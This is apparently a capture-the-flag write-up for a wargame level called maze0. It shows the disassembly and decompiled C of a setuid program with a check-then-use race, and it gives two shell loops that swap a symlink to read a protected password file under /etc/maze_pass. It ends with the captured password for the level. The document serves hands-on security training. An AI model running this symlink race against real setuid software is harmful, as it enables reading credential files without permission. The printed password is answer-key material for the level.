```assembly
   0x0804854b <+0>:	push   %ebp
   0x0804854c <+1>:	mov    %esp,%ebp
   0x0804854e <+3>:	push   %esi
   0x0804854f <+4>:	push   %ebx
   0x08048550 <+5>:	sub    $0x18,%esp
   0x08048553 <+8>:	push   $0x14
   0x08048555 <+10>:	push   $0x0
   0x08048557 <+12>:	lea    -0x20(%ebp),%eax
   0x0804855a <+15>:	push   %eax
   0x0804855b <+16>:	call   0x8048420 <memset@plt>
   0x08048560 <+21>:	add    $0xc,%esp
   0x08048563 <+24>:	push   $0x4
   0x08048565 <+26>:	push   $0x8048660
   0x0804856a <+31>:	call   0x8048430 <access@plt>
   0x0804856f <+36>:	add    $0x8,%esp
   0x08048572 <+39>:	test   %eax,%eax
   0x08048574 <+41>:	jne    0x80485d4 <main+137>
   0x08048576 <+43>:	call   0x80483d0 <geteuid@plt>
   0x0804857b <+48>:	mov    %eax,%esi
   0x0804857d <+50>:	call   0x80483d0 <geteuid@plt>
   0x08048582 <+55>:	mov    %eax,%ebx
   0x08048584 <+57>:	call   0x80483d0 <geteuid@plt>
---Type <return> to continue, or q <return> to quit---
   0x08048589 <+62>:	push   %esi
   0x0804858a <+63>:	push   %ebx
   0x0804858b <+64>:	push   %eax
   0x0804858c <+65>:	call   0x80483b0 <setresuid@plt>
   0x08048591 <+70>:	add    $0xc,%esp
   0x08048594 <+73>:	push   $0x0
   0x08048596 <+75>:	push   $0x8048660
   0x0804859b <+80>:	call   0x80483f0 <open@plt>
   0x080485a0 <+85>:	add    $0x8,%esp
   0x080485a3 <+88>:	mov    %eax,-0xc(%ebp)
   0x080485a6 <+91>:	cmpl   $0x0,-0xc(%ebp)
   0x080485aa <+95>:	jns    0x80485b3 <main+104>
   0x080485ac <+97>:	push   $0xffffffff
   0x080485ae <+99>:	call   0x80483e0 <exit@plt>
   0x080485b3 <+104>:	push   $0x13
   0x080485b5 <+106>:	lea    -0x20(%ebp),%eax
   0x080485b8 <+109>:	push   %eax
   0x080485b9 <+110>:	pushl  -0xc(%ebp)
   0x080485bc <+113>:	call   0x80483c0 <read@plt>
   0x080485c1 <+118>:	add    $0xc,%esp
   0x080485c4 <+121>:	push   $0x13
   0x080485c6 <+123>:	lea    -0x20(%ebp),%eax
   0x080485c9 <+126>:	push   %eax
---Type <return> to continue, or q <return> to quit---
   0x080485ca <+127>:	push   $0x1
   0x080485cc <+129>:	call   0x8048410 <write@plt>
   0x080485d1 <+134>:	add    $0xc,%esp
   0x080485d4 <+137>:	mov    $0x0,%eax
   0x080485d9 <+142>:	lea    -0x8(%ebp),%esp
   0x080485dc <+145>:	pop    %ebx
   0x080485dd <+146>:	pop    %esi
   0x080485de <+147>:	pop    %ebp
   0x080485df <+148>:	ret 
```

```c
int main(int argc,char **argv)

{
  int __fd;
  __uid_t __suid;
  __uid_t __euid;
  __uid_t __ruid;
  char buf [20];
  int fd;
  
  memset(buf,0,0x14);
  __fd = access("/tmp/128ecf542a35ac5270a87dc740918404",4);
  if (__fd == 0) {
    __suid = geteuid();
    __euid = geteuid();
    __ruid = geteuid();
    setresuid(__ruid,__euid,__suid);
    __fd = open("/tmp/128ecf542a35ac5270a87dc740918404",0);
    if (__fd < 0) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    read(__fd,buf,0x13);
    write(1,buf,0x13);
  }
  return 0;
}
```

Explanation:

|      | This was a file race condition challenge. Maze0 first checks to see if it has access permitions to a file "/tmp/128ecf542a35ac5270a87dc740918404." It then changes its effective User ID to Maze1, opens that same file, reads the contents and prints it to the console. By making that file a symbolic link, you can make the executable read the contents of any file you want. The only problem is the permissions. If the symbolic link links to a file, such as etc/maze_pass/maze1, it will fail the first access check that makes sure Maze0 can read it. However, since the files are being checked at two different point in time, it is possible for another process to change the file between the first check (before the SetUID) and the read afterwards. Therefore, the idea is to have the symlink be readable by Maze0 during the first check, and readable by Maze1 after the SetUID. |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

​	**/tmp/128ecf542a35ac5270a87dc740918404** this is basicaly a symbolic link to the file **/etc /maze_pass/maze1**

![Screen Shot 2019-12-30 at 8.48.14 PM](/Users/tomal/Desktop/Screen Shot 2019-12-30 at 8.48.14 PM.png)

In One tab run :

```
while [ 1 ]; do ./maze0; done;
```

in another run :

```
while [ 1 ]; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404;ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404;clear;done 
```

**This runs maze0 over and over again, while repeatedly swapping the symbolic link between maze0 (readable by maze0) and maze1 (contains the flag)**

**PASS word**:  hashaachon

